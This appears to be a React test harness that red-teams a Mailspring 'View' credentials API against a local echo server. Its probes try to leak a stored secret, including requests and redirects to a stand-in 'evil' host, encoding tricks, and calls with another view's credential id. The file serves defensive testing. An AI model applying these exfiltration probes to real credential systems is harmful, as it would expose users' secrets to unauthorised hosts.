import React, { useEffect, useState } from 'react';
import { credentialFetch, useCredentialStatus, call } from '@mailspring/view';

// Development red team for View credentials. Run against the local echo server described in
// docs/plans/views-api.md §3.10 (hosts mapped to 127.0.0.1 with --host-resolver-rules). Each
// probe records what the View could observe; the test harness then checks that the secret it
// stored never appears anywhere in window.__results and that only echo.* ever received it.

const ECHO = 'https://echo.mailspring-cred.dev';
const EVIL = 'https://evil.mailspring-cred.dev';

async function attempt(fn) {
  try {
    const r = await fn();
    if (r && typeof r.text === 'function') {
      return {
        ok: true,
        status: r.status,
        redacted: r.redacted,
        blockedRedirect: r.blockedRedirect,
        headers: r.headers.entries(),
        body: await r.text(),
      };
    }
    return { ok: true, value: r };
  } catch (err) {
    return { ok: false, code: err.code, message: err.message };
  }
}

const PROBES = [
  ['echo endpoint reflects request headers', () => credentialFetch('echo', `${ECHO}/echo`)],
  ['response headers and Set-Cookie echo the key', () => credentialFetch('echo', `${ECHO}/header-echo`)],
  ['base64 / base64url (Basic auth) echo', () => credentialFetch('echo', `${ECHO}/basic`)],
  ['URL-encoded and JSON-escaped echo', () => credentialFetch('echo', `${ECHO}/urlencoded`)],
  ['binary body containing the key', () => credentialFetch('echo', `${ECHO}/binary`)],
  ['plain http to the bound host', () => credentialFetch('echo', 'http://echo.mailspring-cred.dev/echo')],
  ['non-default port', () => credentialFetch('echo', 'https://echo.mailspring-cred.dev:8443/echo')],
  ['userinfo in URL', () => credentialFetch('echo', 'https://u:p@echo.mailspring-cred.dev/echo')],
  ['granted but unbound host', () => credentialFetch('echo', `${EVIL}/echo`)],
  [
    'redirect from bound host to unbound host',
    () => credentialFetch('echo', `${ECHO}/redirect?to=${encodeURIComponent(`${EVIL}/echo`)}`),
  ],
  ['undeclared credential id', () => credentialFetch('github', `${ECHO}/echo`)],
  [
    'raw bridge call with another id',
    () => call('credentials.fetch', { credentialId: 'other-view-key', url: `${ECHO}/echo` }),
  ],
  [
    "View's own fetch to the bound host",
    async () => {
      const r = await fetch(`${ECHO}/echo`);
      return { status: r.status, body: await r.text() };
    },
  ],
  [
    'View overrides the credential header itself',
    () => credentialFetch('echo', `${ECHO}/echo`, { headers: { authorization: 'Bearer mine', 'X-Extra': '1' } }),
  ],
  ['bridge surface', async () => Object.keys(window.mailspring || {}).join(',')],
];

export default function View() {
  const status = useCredentialStatus('echo');
  const [rows, setRows] = useState([]);

  useEffect(() => {
    if (!status.connected) return;
    (async () => {
      const results = [];
      for (const [name, fn] of PROBES) results.push({ name, result: await attempt(fn) });
      window.__results = results;
      setRows(results);
    })();
  }, [status.connected]);

  return (
    <div className="p-6 text-sm text-ms-text">
      <h1 className="text-lg font-semibold mb-2">Credentials red team</h1>
      <p className="mb-4 text-ms-muted">
        Credential "echo": {status.loading ? 'checking…' : status.connected ? 'connected' : 'not connected'}{' '}
        {!status.connected && (
          <button className="underline text-ms-link" onClick={status.connect}>
            Connect
          </button>
        )}
      </p>
      <table className="w-full">
        <tbody>
          {rows.map(({ name, result }) => (
            <tr key={name} className="border-t border-ms-border align-top">
              <td className="py-1 pr-3 w-64">{name}</td>
              <td className="py-1 font-mono text-xs break-all">
                {JSON.stringify(result).slice(0, 400)}
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}
